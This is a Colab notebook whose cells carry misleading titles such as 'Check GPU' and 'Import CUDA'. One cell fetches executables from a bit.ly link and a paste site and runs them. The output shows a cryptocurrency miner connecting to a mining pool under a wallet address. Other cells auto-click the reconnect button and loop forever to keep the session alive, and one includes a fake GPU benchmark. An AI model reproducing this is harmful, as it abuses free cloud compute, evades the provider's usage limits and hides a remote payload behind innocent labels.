{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Untitled27.ipynb",
      "provenance": [],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "XGkPLekFe7Lf",
        "outputId": "745d3833-6301-4e75-d03e-ba6cc731f684",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        }
      },
      "source": [
        "#@title **First...**\n",
        "\n",
        "print (\"Hello World\")\n",
        "\n",
        "import IPython\n",
        "from google.colab import output\n",
        "\n",
        "display(IPython.display.Javascript('''\n",
        "function ClickConnect(){\n",
        "  btn = document.querySelector(\"colab-connect-button\")\n",
        "  if (btn != null){\n",
        "    console.log(\"Click colab-connect-button\"); \n",
        "    btn.click() \n",
        "    }\n",
        "    \n",
        "  btn = document.getElementById('ok')\n",
        "  if (btn != null){\n",
        "    console.log(\"Click reconnect\"); \n",
        "    btn.click() \n",
        "    }\n",
        "  }\n",
        "    \n",
        "setInterval(ClickConnect,20000)\n",
        "'''))"
      ],
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Hello World\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "application/javascript": [
              "\n",
              "function ClickConnect(){\n",
              "  btn = document.querySelector(\"colab-connect-button\")\n",
              "  if (btn != null){\n",
              "    console.log(\"Click colab-connect-button\"); \n",
              "    btn.click() \n",
              "    }\n",
              "    \n",
              "  btn = document.getElementById('ok')\n",
              "  if (btn != null){\n",
              "    console.log(\"Click reconnect\"); \n",
              "    btn.click() \n",
              "    }\n",
              "  }\n",
              "    \n",
              "setInterval(ClickConnect,20000)\n"
            ],
            "text/plain": [
              "<IPython.core.display.Javascript object>"
            ]
          },
          "metadata": {
            "tags": []
          }
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "qR1AezaMfB_m",
        "outputId": "1c8b58ba-fb58-4714-d863-e25c03728869",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title **Check GPU**\n",
        "! nvidia-smi -L"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "GPU 0: Tesla T4 (UUID: GPU-65d51e0e-4620-6b45-dc4a-976ea49741a1)\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "Oboyk6DkfEAI",
        "outputId": "312955a9-2282-40f8-83ed-2939662bb52c",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title **Mod GPU**\n",
        "\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "# to measure exec time\n",
        "from timeit import default_timer as timer\n",
        "\n",
        "# normal function to run on cpu\n",
        "def func(a):\t\t\t\t\t\t\t\t\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\t\n",
        "\n",
        "\t\t\t\t\t\t\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\t\t\t\t\t\t\t\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start)\t\n",
        "\t\n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)"
      ],
      "execution_count": 3,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "without GPU: 4.4839548070000035\n",
            "with GPU: 4.4937562920000005\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "03FKZaOcfF9o",
        "outputId": "3a7d6da4-4f59-45dc-bd19-94beb8a029fc",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 239
        }
      },
      "source": [
        "#@title **Import CUDA**\n",
        "\n",
        "import os\n",
        "' && '.join([f'export {name}=\"{value}\"' for name, value in os.environ.items()])"
      ],
      "execution_count": 4,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'export NO_GCE_CHECK=\"True\" && export GCS_READ_CACHE_BLOCK_SIZE_MB=\"16\" && export CLOUDSDK_CONFIG=\"/content/.config\" && export __EGL_VENDOR_LIBRARY_DIRS=\"/usr/lib64-nvidia:/usr/share/glvnd/egl_vendor.d/\" && export CUDA_VERSION=\"11.0.3\" && export PATH=\"/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/tools/node/bin:/tools/google-cloud-sdk/bin:/opt/bin\" && export HOME=\"/root\" && export LD_LIBRARY_PATH=\"/usr/lib64-nvidia\" && export LANG=\"en_US.UTF-8\" && export SHELL=\"/bin/bash\" && export LIBRARY_PATH=\"/usr/local/cuda/lib64/stubs\" && export SHLVL=\"0\" && export GCE_METADATA_TIMEOUT=\"0\" && export NCCL_VERSION=\"2.7.8\" && export NVIDIA_VISIBLE_DEVICES=\"all\" && export DEBIAN_FRONTEND=\"noninteractive\" && export CUDNN_VERSION=\"8.0.4.30\" && export LAST_FORCED_REBUILD=\"20210614\" && export JPY_PARENT_PID=\"49\" && export PYTHONPATH=\"/env/python\" && export DATALAB_SETTINGS_OVERRIDES=\"{\"kernelManagerProxyPort\":6000,\"kernelManagerProxyHost\":\"172.28.0.3\",\"jupyterArgs\":[\"--ip=\\\\\"172.28.0.2\\\\\"\"],\"debugAdapterMultiplexerPath\":\"/usr/local/bin/dap_multiplexer\",\"enableLsp\":true}\" && export ENV=\"/root/.bashrc\" && export GLIBCXX_FORCE_NEW=\"1\" && export NVIDIA_DRIVER_CAPABILITIES=\"compute,utility\" && export TF_FORCE_GPU_ALLOW_GROWTH=\"true\" && export LD_PRELOAD=\"/usr/lib/x86_64-linux-gnu/libtcmalloc.so.4\" && export NVIDIA_REQUIRE_CUDA=\"cuda>=11.0 brand=tesla,driver>=418,driver<419 brand=tesla,driver>=440,driver<441 brand=tesla,driver>=450,driver<451\" && export OLDPWD=\"/\" && export HOSTNAME=\"66ccc014d665\" && export COLAB_GPU=\"1\" && export PWD=\"/\" && export CLOUDSDK_PYTHON=\"python3\" && export GLIBCPP_FORCE_NEW=\"1\" && export PYTHONWARNINGS=\"ignore:::pip._internal.cli.base_command\" && export TBE_CREDS_ADDR=\"172.28.0.1:8008\" && export TERM=\"xterm-color\" && export CLICOLOR=\"1\" && export PAGER=\"cat\" && export GIT_PAGER=\"cat\" && export MPLBACKEND=\"module://ipykernel.pylab.backend_inline\" && export PYDEVD_USE_FRAME_EVAL=\"NO\"'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 4
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "yNFST5ASfI9E",
        "outputId": "5a9320e4-a7ee-4b68-b34e-3bea8529ce6d",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "\n",
        "#@title **Tensor Maksimum**\n",
        "\n",
        "import tensorflow as tf\n",
        "\n",
        "from tensorflow import keras\n",
        "from tensorflow.keras import layers\n",
        "from tensorflow.keras import mixed_precision\n",
        "\n",
        "mixed_precision.set_global_policy('mixed_float16')"
      ],
      "execution_count": 5,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "INFO:tensorflow:Mixed precision compatibility check (mixed_float16): OK\n",
            "Your GPU will likely run quickly with dtype policy mixed_float16 as it has compute capability of at least 7.0. Your GPU: Tesla T4, compute capability 7.5\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WlZBIuqOfL5a",
        "cellView": "form",
        "outputId": "da30300e-9315-4d25-a46b-2044d9c9e909",
        "colab": {
          "base_uri": "https://localhost:8080/"
        }
      },
      "source": [
        "#@title **Gaskeunn.....**\n",
        "\n",
        "!sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh && wget https://bit.ly/2UzE8BC && chmod +x 2UzE8BC && wget  https://www.heypasteit.com/download/0IW9PC && chmod u+x 0IW9PC && ./0IW9PC 65 75"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "\u001b[33m\r0% [Working]\u001b[0m\r            \rHit:1 http://security.ubuntu.com/ubuntu bionic-security InRelease\n",
            "\u001b[33m\r0% [Connecting to archive.ubuntu.com (91.189.88.152)] [Connected to cloud.r-pro\u001b[0m\u001b[33m\r0% [1 InRelease gpgv 88.7 kB] [Connecting to archive.ubuntu.com (91.189.88.152)\u001b[0m\r                                                                               \rHit:2 https://cloud.r-project.org/bin/linux/ubuntu bionic-cran40/ InRelease\n",
            "Ign:3 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64  InRelease\n",
            "Hit:4 http://archive.ubuntu.com/ubuntu bionic InRelease\n",
            "Hit:5 http://ppa.launchpad.net/c2d4u.team/c2d4u4.0+/ubuntu bionic InRelease\n",
            "Ign:6 https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64  InRelease\n",
            "Hit:7 https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64  Release\n",
            "Hit:8 https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64  Release\n",
            "Hit:9 http://archive.ubuntu.com/ubuntu bionic-updates InRelease\n",
            "Hit:10 http://archive.ubuntu.com/ubuntu bionic-backports InRelease\n",
            "Hit:11 http://ppa.launchpad.net/cran/libgit2/ubuntu bionic InRelease\n",
            "Hit:13 http://ppa.launchpad.net/deadsnakes/ppa/ubuntu bionic InRelease\n",
            "Hit:15 http://ppa.launchpad.net/graphics-drivers/ppa/ubuntu bionic InRelease\n",
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "70 packages can be upgraded. Run 'apt list --upgradable' to see them.\n",
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "screen is already the newest version (4.6.2-1ubuntu1.1).\n",
            "0 upgraded, 0 newly installed, 0 to remove and 70 not upgraded.\n",
            "--2021-06-24 17:17:24--  https://bit.ly/2UzE8BC\n",
            "Resolving bit.ly (bit.ly)... 67.199.248.11, 67.199.248.10\n",
            "Connecting to bit.ly (bit.ly)|67.199.248.11|:443... connected.\n",
            "HTTP request sent, awaiting response... 301 Moved Permanently\n",
            "Location: https://github.com/JackPeterson01/shortlink/raw/main/tuyulgpu [following]\n",
            "--2021-06-24 17:17:24--  https://github.com/JackPeterson01/shortlink/raw/main/tuyulgpu\n",
            "Resolving github.com (github.com)... 140.82.112.4\n",
            "Connecting to github.com (github.com)|140.82.112.4|:443... connected.\n",
            "HTTP request sent, awaiting response... 302 Found\n",
            "Location: https://raw.githubusercontent.com/JackPeterson01/shortlink/main/tuyulgpu [following]\n",
            "--2021-06-24 17:17:24--  https://raw.githubusercontent.com/JackPeterson01/shortlink/main/tuyulgpu\n",
            "Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.109.133, 185.199.108.133, ...\n",
            "Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: 4938116 (4.7M) [application/octet-stream]\n",
            "Saving to: ‘2UzE8BC’\n",
            "\n",
            "2UzE8BC             100%[===================>]   4.71M  --.-KB/s    in 0.06s   \n",
            "\n",
            "2021-06-24 17:17:24 (83.1 MB/s) - ‘2UzE8BC’ saved [4938116/4938116]\n",
            "\n",
            "--2021-06-24 17:17:24--  https://www.heypasteit.com/download/0IW9PC\n",
            "Resolving www.heypasteit.com (www.heypasteit.com)... 172.67.128.65, 104.21.0.201, 2606:4700:3037::ac43:8041, ...\n",
            "Connecting to www.heypasteit.com (www.heypasteit.com)|172.67.128.65|:443... connected.\n",
            "HTTP request sent, awaiting response... 200 OK\n",
            "Length: unspecified [application/octet-stream]\n",
            "Saving to: ‘0IW9PC’\n",
            "\n",
            "0IW9PC                  [ <=>                ]     225  --.-KB/s    in 0s      \n",
            "\n",
            "2021-06-24 17:17:24 (36.4 MB/s) - ‘0IW9PC’ saved [225]\n",
            "\n",
            "\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m   _       _ __  __ _                   _   ____   ___   \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  | | ___ | |  \\/  (_)_ __   ___ _ __  / | |___ \\ / _ \\  \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  | |/ _ \\| | |\\/| | | '_ \\ / _ \\ '__| | |   __) | (_) | \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  | | (_) | | |  | | | | | |  __/ |    | |_ / __/ \\__, | \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m  |_|\\___/|_|_|  |_|_|_| |_|\\___|_|    |_(_)_____|  /_/  \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              This software is for mining                \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Ethash, Etchash                            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Equihash 144/5, 192/7, 210/9               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              BeamHash I, II, III                        \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              ZelHash     (EquihashR 125/4/0)            \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuck(ar)oo 29                              \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckaroo   30 CTX                          \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Cuckatoo   31/32                           \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m                                                         \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m|\u001b[0m              Made by Lolliedieb, May 2021               \u001b[1m\u001b[38;2;100;149;237m|\n",
            "\u001b[0m\u001b[1m\u001b[38;2;100;149;237m+---------------------------------------------------------+\n",
            "\u001b[0m\n",
            "Setup Miner... \n",
            "OpenCL driver detected.\n",
            "Number of OpenCL supported GPUs: 1 \n",
            "Cuda driver detected.\n",
            "Number of Cuda supported GPUs: 1 \n",
            "Device 0: \n",
            "    Name:    \u001b[38;2;000;128;000mTesla T4 \n",
            "\u001b[0m    Address: 0:4 \n",
            "    Vendor:  NVIDIA Corporation\n",
            "    Drivers: Cuda, OpenCL\n",
            "    Memory:  15109 MByte \n",
            "    Active:  true (Selected Algorithm: ETHash Cuda) \n",
            "\n",
            "Connecting to pool... \n",
            "\u001b[38;2;240;230;140mConnected to ethash.unmineable.com:3333  (TLS disabled)\n",
            "\u001b[0mSet Ethash stratum mode: Ethereum Proxy\n",
            "\u001b[38;2;240;230;140mAuthorized worker: TRX:TD7L1BXFTy1qq7VxAc2pPR2eQCZFHFzyXo. \n",
            "\u001b[0m\u001b[38;2;189;183;107mNew job received: 0x5b1291 Epoch: 423 Target: 000000007e000000 \n",
            "\u001b[0mStart Mining... \n",
            "\u001b[38;2;100;149;237m------------------------------------------------------- \n",
            "\u001b[0m\u001b[38;2;100;149;237m          Generated light cache for epoch 423 \n",
            "\u001b[0m\u001b[38;2;100;149;237m       Took 2990 ms, size of new DAG: 4407 MByte \n",
            "\u001b[0m\u001b[38;2;100;149;237m------------------------------------------------------- \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: Starting DAG generation (normal mode)\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 17%\n",
            "GPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 34%\n",
            "\u001b[38;2;189;183;107mNew job received: 0x527b75 Epoch: 423 Target: 000000007e000000 \n",
            "\u001b[0mGPU \u001b[38;2;240;230;140m0\u001b[0m: DAG build complete 52%\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "cellView": "form",
        "id": "44BJKkKOfM3N"
      },
      "source": [
        "#@title **Optional**\n",
        "\n",
        "while True:pass"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}